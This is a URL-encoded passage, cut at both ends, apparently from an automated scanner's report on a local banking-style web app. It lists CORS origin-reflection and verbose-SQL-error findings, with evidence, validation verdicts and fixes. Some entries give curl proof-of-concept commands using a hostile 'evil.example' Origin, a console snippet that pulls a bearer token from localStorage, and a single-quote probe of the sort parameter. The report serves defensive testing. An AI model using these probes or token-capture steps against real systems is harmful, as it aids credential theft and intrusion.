'token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Profile%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20transactions%20API%20reflects%20an%20attacker-controlled%20Origin%20value%20and%20enables%20credentialed%20cross-origin%20requests.%22%2C%22impact%22%3A%22A%20malicious%20site%20may%20be%20able%20to%20read%20API%20responses%20when%20a%20victim's%20browser%20automatically%20supplies%20valid%20credentials.%22%2C%22likelihood%22%3A%22Low%20in%20the%20observed%20context%20because%20the%20request%20used%20an%20Authorization%20header%2C%20which%20a%20malicious%20origin%20cannot%20automatically%20obtain%20or%20attach.%22%2C%22recommendation%22%3A%22Allow%20only%20trusted%20origins%2C%20disable%20credentialed%20CORS%20unless%20required%2C%20and%20restrict%20allowed%20methods%20and%20headers.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22A%20request%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20received%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%20and%20Access-Control-Allow-Credentials%3A%20true.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D1%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A28%3A06%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20130%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A1%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A0%2C%5C%22total_pages%5C%22%3A0%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D1%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A28%3A06%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20130%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A1%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A0%2C%5C%22total_pages%5C%22%3A0%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20raw%20endpoint%20reflects%20the%20supplied%20Origin%20and%20returns%20Access-Control-Allow-Credentials%3A%20true.%20Anonymous%20access%20is%20rejected%2C%20but%20the%20listed%20admin_test%20session%20receives%20HTTP%20200%20and%20transaction%20records%20with%20the%20evil%20Origin%2C%20so%20a%20browser-controlled%20cross-origin%20request%20can%20read%20authenticated%20data.%20The%20reported%20account_id%3D3%20response%20was%20empty%2C%20but%20that%20is%20only%20an%20empty%20fixture%20and%20does%20not%20explain%20away%20the%20same%20policy%20on%20the%20resource%20when%20account_id%3D1%20contains%20records.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-H%20'Origin%3A%20https%3A%2F%2Fevil.example'%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin_test**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin_test%20user%20and%20copy%20its%20bearer%20token%20from%20the%20Authorization%20request%20header%20in%20the%20browser%20DevTools%20Network%20panel.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Transaction%20API%20allows%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20transaction%20endpoint%20reflects%20an%20attacker-controlled%20Origin%20value%20in%20the%20Access-Control-Allow-Origin%20response%20header.%22%2C%22impact%22%3A%22A%20malicious%20website%20could%20read%20API%20responses%20through%20a%20victim's%20browser%20if%20the%20browser%20sends%20usable%20authentication%20with%20cross-origin%20requests.%20This%20weakens%20the%20same-origin%20boundary.%22%2C%22likelihood%22%3A%22Arbitrary%20origin%20reflection%20was%20reproduced%20using%20https%3A%2F%2Fevil.example.%20Exploitation%20depends%20on%20whether%20the%20victim's%20browser%20supplies%20valid%20authentication%20and%20whether%20sensitive%20response%20data%20can%20be%20accessed.%20No%20cross-origin%20access%20to%20sensitive%20authenticated%20data%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Configure%20an%20explicit%20allowlist%20of%20trusted%20application%20origins.%20Return%20Access-Control-Allow-Origin%20only%20when%20the%20request%20Origin%20matches%20an%20approved%20origin%2C%20and%20omit%20CORS%20headers%20for%20all%20other%20origins.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22A%20GET%20request%20to%20the%20transaction%20endpoint%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20returned%20HTTP%20200%20and%20access-control-allow-origin%3A%20https%3A%2F%2Fevil.example.%20The%20JSON%20response%20contained%20an%20empty%20transaction%20list%20and%20pagination%20data.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D1%26per_page%3D15%5CnOrigin%3A%20https%3A%2F%2Fevil.example%22%2C%22response_evidence%22%3A%22HTTP%2F1.1%20200%20OK%5Cnaccess-control-allow-origin%3A%20https%3A%2F%2Fevil.example%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A1%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A0%2C%5C%22total_pages%5C%22%3A0%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20endpoint%20reflected%20https%3A%2F%2Fevil.example%20in%20Access-Control-Allow-Origin%20and%20also%20returned%20Access-Control-Allow-Credentials%3A%20true%20on%20an%20authenticated%20200%20response.%20A%20matching%20browser%20preflight%20for%20GET%20with%20the%20Authorization%20header%20also%20returned%20200%20and%20reflected%20the%20attacker%20origin%2C%20so%20direct-request%20or%20preflight%20enforcement%20does%20not%20provide%20an%20innocent%20explanation.%20Authentication%20uses%20an%20Authorization%20header%20rather%20than%20a%20cookie%2C%20which%20limits%20practical%20victim-session%20exploitation%2C%20but%20it%20does%20not%20disprove%20the%20reported%20arbitrary-origin%20CORS%20configuration.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-H%20'Origin%3A%20https%3A%2F%2Fevil.example'%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D1%26per_page%3D15'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%20and%20copy%20the%20bearer%20token%20from%20the%20Authorization%20request%20header%20in%20the%20browser%20Network%20tab.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Admin%20customer%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20authenticated%20admin%20customer%20endpoint%20reflects%20an%20attacker-controlled%20Origin%20header%20in%20the%20Access-Control-Allow-Origin%20response%20header%20while%20returning%20customer%20records.%22%2C%22impact%22%3A%22A%20malicious%20origin%20could%20potentially%20read%20sensitive%20admin%20API%20responses%20if%20browser-accessible%20authentication%20is%20accepted%20on%20cross-origin%20requests.%20This%20could%20expose%20customer%20names%2C%20email%20addresses%2C%20phone%20numbers%2C%20TOTP%20status%2C%20and%20account%20counts.%22%2C%22likelihood%22%3A%22Arbitrary%20origin%20reflection%20was%20reproduced%20consistently.%20Cross-origin%20access%20to%20authenticated%20data%20was%20not%20demonstrated%20in%20a%20browser%2C%20so%20practical%20exploitation%20depends%20on%20how%20authentication%20credentials%20are%20stored%20and%20sent.%22%2C%22recommendation%22%3A%22Configure%20Access-Control-Allow-Origin%20using%20an%20explicit%20allowlist%20of%20trusted%20admin%20origins.%20Do%20not%20reflect%20arbitrary%20Origin%20values%2C%20and%20disable%20credentialed%20cross-origin%20requests%20unless%20they%20are%20required.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22An%20authorized%20GET%20request%20to%20%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20returned%20HTTP%20200%2C%20reflected%20https%3A%2F%2Fevil.example%20in%20Access-Control-Allow-Origin%2C%20and%20returned%20a%20JSON%20customer%20list%20containing%20emails%2C%20names%2C%20phone%20numbers%2C%20TOTP%20status%2C%20and%20account%20counts.%22%2C%22request_evidence%22%3A%22Authorized%20GET%20%2Fapi%2Fadmin%2Fcustomers%3Fpage%3D1%26per_page%3D15%20with%20Origin%3A%20https%3A%2F%2Fevil.example.%22%2C%22response_evidence%22%3A%22HTTP%20200%20with%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%20and%20a%20JSON%20customer%20list.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22The%20reflected%20Origin%20header%20is%20real%2C%20but%20it%20does%20not%20expose%20an%20administrator's%20browser%20session.%20The%20supplied%20admin%20session%20authenticates%20with%20an%20explicit%20Authorization%20header%20and%20sends%20no%20cookies%3B%20the%20same%20cross-origin%20request%20without%20that%20header%20returned%20401%20with%20%5C%22Missing%20or%20invalid%20Authorization%20header%5C%22%20and%20no%20customer%20records.%20This%20is%20a%20bearer-token%20API%20allowing%20cross-origin%20clients%2C%20and%20an%20attacker-controlled%20web%20origin%20cannot%20make%20the%20browser%20attach%20the%20victim's%20Authorization%20token%20automatically.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Profile%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20authenticated%20profile%20endpoint%20reflects%20an%20untrusted%20Origin%20value%20in%20the%20Access-Control-Allow-Origin%20response%20header.%22%2C%22impact%22%3A%22A%20malicious%20website%20could%20read%20sensitive%20profile%20data%20if%20the%20user's%20authentication%20material%20is%20available%20to%20cross-origin%20requests.%20The%20response%20also%20exposes%20customer%20contact%20details%20and%20password_hash%20values%2C%20increasing%20the%20sensitivity%20of%20successful%20exploitation.%22%2C%22likelihood%22%3A%22Origin%20reflection%20was%20reproduced%20with%20a%20valid%20test%20session.%20Browser-based%20cross-origin%20access%20was%20not%20demonstrated%2C%20so%20exploitation%20depends%20on%20how%20authentication%20tokens%20are%20stored%20and%20sent.%22%2C%22recommendation%22%3A%22Configure%20an%20explicit%20allowlist%20of%20trusted%20application%20origins%20and%20never%20reflect%20arbitrary%20Origin%20values.%20Disable%20cross-origin%20credential%20use%20unless%20it%20is%20required.%20Remove%20password_hash%20and%20other%20unnecessary%20sensitive%20fields%20from%20profile%20responses.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%22%2C%22evidence%22%3A%22A%20GET%20request%20to%20%2Fapi%2Fprofile%20using%20a%20valid%20test%20session%20and%20Origin%3A%20https%3A%2F%2Fevil.example%20returned%20HTTP%20200%20with%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example.%20The%20response%20body%20contained%20the%20customer's%20email%2C%20address%2C%20phone%2C%20and%20password_hash.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Fprofile%20with%20a%20valid%20test%20session%20and%20Origin%3A%20https%3A%2F%2Fevil.example.%22%2C%22response_evidence%22%3A%22HTTP%20200%2C%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%2C%20and%20a%20profile%20body%20containing%20customer%20email%2C%20address%2C%20phone%2C%20and%20password_hash.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22The%20successful%20request%20used%20the%20%60http_token%60%20session%2C%20and%20the%20captured%20request%20evidence%20shows%20an%20Authorization%20header%20but%20no%20cookies.%20An%20unauthenticated%20request%20returned%20401%2C%20so%20the%20API%20does%20not%20rely%20on%20an%20ambient%20browser%20credential%20that%20a%20hostile%20site%20can%20cause%20the%20browser%20to%20attach.%20The%20preflight%20also%20returned%20only%20%60Access-Control-Allow-Headers%3A%20*%60%3B%20Authorization%20is%20a%20CORS%20non-wildcard%20request%20header%20and%20must%20be%20named%20explicitly%2C%20so%20browser%20JavaScript%20cannot%20use%20this%20response%20to%20send%20the%20bearer%20token%20and%20read%20the%20profile.%20The%20raw%20HTTP%20client%20reproduced%20Origin%20reflection%2C%20but%20that%20does%20not%20create%20cross-origin%20profile%20disclosure%20for%20this%20header-token%20authentication%20flow.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Profile%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20API%20reflects%20an%20attacker-controlled%20Origin%20value%20and%20enables%20credentialed%20cross-origin%20requests.%22%2C%22impact%22%3A%22A%20malicious%20website%20may%20be%20able%20to%20read%20API%20responses%20when%20the%20victim%20uses%20browser-managed%20credentials%20accepted%20by%20the%20application.%22%2C%22likelihood%22%3A%22The%20CORS%20behavior%20is%20confirmed%2C%20but%20no%20sensitive%20authenticated%20response%20was%20shown%20as%20readable%20cross-origin.%22%2C%22recommendation%22%3A%22Allow%20only%20trusted%20origins%2C%20disable%20credentialed%20CORS%20where%20unnecessary%2C%20restrict%20allowed%20headers%20and%20methods%2C%20and%20test%20sensitive%20endpoints%20from%20an%20untrusted%20origin.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fpayments%2Ftransfer%22%2C%22evidence%22%3A%22A%20request%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20received%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%20and%20Access-Control-Allow-Credentials%3A%20true.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fpayments%2Ftransfer%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A15%3A19%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20https%3A%2F%2Fevil.example%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fpayments%2Ftransfer%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A15%3A19%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20https%3A%2F%2Fevil.example%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22The%20CORS%20headers%20are%20present%2C%20but%20this%20route%20does%20not%20use%20browser-managed%20credentials.%20An%20anonymous%20POST%20receives%20401%20with%20%60Missing%20or%20invalid%20Authorization%20header%60%2C%20every%20supplied%20machine-token%20session%20was%20rejected%2C%20and%20no%20request%20carried%20cookies%3B%20the%20endpoint%20therefore%20requires%20an%20explicit%20Authorization%20machine%20token%20rather%20than%20an%20ambient%20session%20cookie.%20The%20reflected%20headers%20can%20be%20observed%20on%20the%20405%2F401%20responses%2C%20but%20they%20do%20not%20give%20an%20attacker%20access%20to%20a%20user's%20transfer%20data%20or%20bypass%20authentication%2C%20so%20the%20scanner's%20credentialed-access%20claim%20is%20not%20established.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Transaction%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20transaction%20history%20endpoint%20reflects%20an%20arbitrary%20Origin%20value%20in%20the%20Access-Control-Allow-Origin%20response%20header%20while%20returning%20financial%20transaction%20records.%22%2C%22impact%22%3A%22JavaScript%20hosted%20on%20an%20attacker-controlled%20origin%20could%20read%20transaction%20records%20through%20a%20victim's%20browser%20when%20the%20endpoint%20is%20reachable.%20The%20observed%20endpoint%20was%20also%20accessible%20without%20authentication%2C%20which%20limits%20the%20additional%20impact%20of%20the%20CORS%20misconfiguration.%22%2C%22likelihood%22%3A%22Exploitation%20of%20the%20CORS%20behavior%20is%20straightforward%20because%20the%20supplied%20untrusted%20origin%20was%20accepted.%20Overall%20severity%20is%20low%20because%20the%20transaction%20data%20was%20already%20available%20through%20an%20unauthenticated%20request.%22%2C%22recommendation%22%3A%22Configure%20an%20explicit%20allowlist%20containing%20only%20trusted%20application%20origins.%20If%20cross-origin%20access%20is%20not%20required%2C%20omit%20CORS%20response%20headers%20and%20restrict%20the%20API%20to%20same-origin%20requests.%20Do%20not%20reflect%20arbitrary%20Origin%20values.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22A%20GET%20request%20sent%20without%20authentication%20and%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20returned%20HTTP%20200%2C%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%2C%20and%20JSON%20transaction%20history%20containing%20amounts%2C%20descriptions%2C%20account%20IDs%2C%20receipt%20numbers%2C%20and%20TOTP%20status.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20and%20no%20authentication.%22%2C%22response_evidence%22%3A%22HTTP%20200%20with%20access-control-allow-origin%3A%20https%3A%2F%2Fevil.example%20and%20JSON%20transaction%20history.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22The%20scanner's%20key%20claim%20that%20the%20transaction%20records%20are%20returned%20without%20authentication%20is%20false.%20Repeating%20the%20exact%20request%20anonymously%20returned%20401%20with%20only%20a%20generic%20authentication%20error%3B%20a%20named%20session%20without%20a%20usable%20Authorization%20header%20also%20returned%20401.%20A%20supplied%20bearer-token%20session%20was%20required%20to%20reach%20authenticated%20behavior%2C%20and%20the%20request%20evidence%20shows%20no%20cookies%2C%20so%20a%20page%20on%20an%20attacker-controlled%20origin%20cannot%20cause%20the%20browser%20to%20attach%20this%20credential%20ambiently.%20The%20server%20does%20reflect%20Origin%2C%20including%20on%20an%20authenticated%20admin%20response%2C%20but%20in%20this%20authentication%20model%20that%20header%20alone%20does%20not%20expose%20transaction%20data%20cross-origin.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Transaction%20API%20returns%20verbose%20database%20errors%20and%20stack%20traces%22%2C%22description%22%3A%22The%20unauthenticated%20transaction%20endpoint%20returns%20raw%20MariaDB%20errors%20and%20a%20full%20PHP%20stack%20trace%20when%20the%20sort%20parameter%20contains%20malformed%20input.%20The%20response%20discloses%20SQL%20fragments%2C%20source%20file%20paths%2C%20line%20numbers%2C%20class%20names%2C%20and%20application%20routing%20details.%22%2C%22impact%22%3A%22An%20unauthenticated%20attacker%20can%20use%20the%20disclosed%20database%20and%20application%20internals%20to%20better%20understand%20the%20query%20structure%20and%20source%20layout%2C%20making%20targeted%20attacks%20easier%20to%20develop.%22%2C%22likelihood%22%3A%22High.%20Adding%20a%20single%20quote%20to%20the%20public%20sort%20parameter%20reliably%20triggered%20the%20verbose%20error%20response%20without%20authentication.%22%2C%22recommendation%22%3A%22Return%20a%20generic%20error%20response%20to%20clients%20and%20record%20exception%20details%20only%20in%20server-side%20logs.%20Disable%20debug%20error%20output%20in%20production.%20Validate%20the%20sort%20parameter%20against%20an%20allowlist%20of%20permitted%20column%20names%20and%20sort%20directions%20before%20constructing%20the%20query.%22%2C%22cvss_score%22%3A3.7%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D999%26per_page%3D15%26sort%3Dcreated_at%2527%22%2C%22evidence%22%3A%22The%20unauthenticated%20request%20returned%20HTTP%20500%20JSON%20with%20code%20INTERNAL_ERROR.%20The%20response%20included%20SQLSTATE%5B42000%5D%2C%20MariaDB%20error%201064%2C%20the%20query%20fragment%20%60DESC%20LIMIT%20%3F%20OFFSET%20%3F%60%2C%20%60%2Fvar%2Fwww%2Fhtml%2Fsrc%2FModels%2FTransaction.php%60%20line%2041%2C%20and%20a%20stack%20trace%20through%20TransactionController.php%2C%20Router.php%2C%20and%20public%2Findex.php.%22%2C%22request_evidence%22%3A%2